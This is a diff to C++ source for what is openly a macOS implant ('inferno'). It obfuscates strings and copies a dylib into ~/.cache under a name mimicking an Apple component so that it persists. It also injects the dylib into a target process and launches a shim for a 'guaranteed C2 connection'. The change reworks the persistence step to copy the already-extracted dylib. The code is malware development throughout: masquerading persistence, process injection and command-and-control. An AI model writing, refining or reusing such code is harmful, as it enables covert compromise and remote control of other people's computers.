@@ -4,6 +4,7 @@
 #include <cstring>
 #include <string>
 #include <vector>
+#include <fstream>
 #include <random>
 #include <chrono>
 #include "unlit.hpp"
@@ -449,15 +450,18 @@ int main(int argc, char* argv[]) {
             std::string cache_dir = std::string(home) + UNLIT("/.cache");
             std::string persist_path = cache_dir + UNLIT("/com.apple.amp.itmstransporter.dylib");
             ::mkdir(cache_dir.c_str(), 0755);
-            // Copy dylib to persistent location
-            std::vector<unsigned char> dylib_data(inferno::wrapper::AGENT_BINARY,
-                                                  inferno::wrapper::AGENT_BINARY + inferno::wrapper::AGENT_BINARY_SIZE);
-            decryptInPlace(dylib_data.data(), dylib_data.size());
-            FILE* pf = ::fopen(persist_path.c_str(), UNLIT("wb"));
-            if (pf) {
-                ::fwrite(dylib_data.data(), 1, dylib_data.size(), pf);
-                ::fclose(pf);
-                ::chmod(persist_path.c_str(), 0644);
+            // Copy the already-extracted temp dylib to persistent location
+            std::ifstream src(dylib_path, std::ios::binary);
+            if (src) {
+                std::vector<unsigned char> copy((std::istreambuf_iterator<char>(src)),
+                                                 std::istreambuf_iterator<char>());
+                src.close();
+                FILE* pf = ::fopen(persist_path.c_str(), UNLIT("wb"));
+                if (pf) {
+                    ::fwrite(copy.data(), 1, copy.size(), pf);
+                    ::fclose(pf);
+                    ::chmod(persist_path.c_str(), 0644);
+                }
             }
         }
     }
@@ -472,7 +476,7 @@ int main(int argc, char* argv[]) {
         inferno::tier2::injectIntoTarget(best, dylib_path, ip, port);
     }
 
-    // Step 2b: Always launch Tier 1 (shim) — guaranteed C2 connection
+    // Step 2c: Always launch Tier 1 (shim) — guaranteed C2 connection
     std::fprintf(stdout, "[Wrapper] Launching Tier 1 (shim) for guaranteed C2\n");
     if (!launchShim(shim_path, dylib_path, ip, port)) {
         ::remove(dylib_path.c_str());
